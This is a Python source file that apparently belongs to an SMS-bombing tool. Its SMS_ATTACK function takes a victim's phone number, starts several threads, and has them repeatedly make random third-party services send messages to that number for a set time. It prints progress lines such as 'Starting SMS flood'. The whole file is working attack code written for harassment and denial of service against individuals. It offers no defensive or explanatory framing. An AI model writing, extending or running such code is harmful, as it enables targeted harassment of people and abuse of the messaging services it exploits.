import time
from threading import Thread
import tools.SMS.sendRequest as request
import tools.SMS.numberTools as number
import tools.SMS.randomData  as randomData

def SMS_ATTACK(threads, attack_time, phone):
	global FINISH
	FINISH = False
	threads_list = []
	services = request.getServices()
	phone = number.normalize(phone)
	country = number.getCountry(phone)
	print("[#] Starting SMS flood to number: " + phone + ", country: " + country + ", time: " + str(attack_time) + " secounds..")

	def sms_flood():
		while not FINISH:
			service = randomData.random_service(services)
			service = request.Service(service)
			service.sendMessage(phone)

	for thread in range(threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = sms_flood)
		t.start()
		threads_list.append(t)
	try:
		time.sleep(attack_time)
	except KeyboardInterrupt:
		FINISH = True
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] Attack stopped!")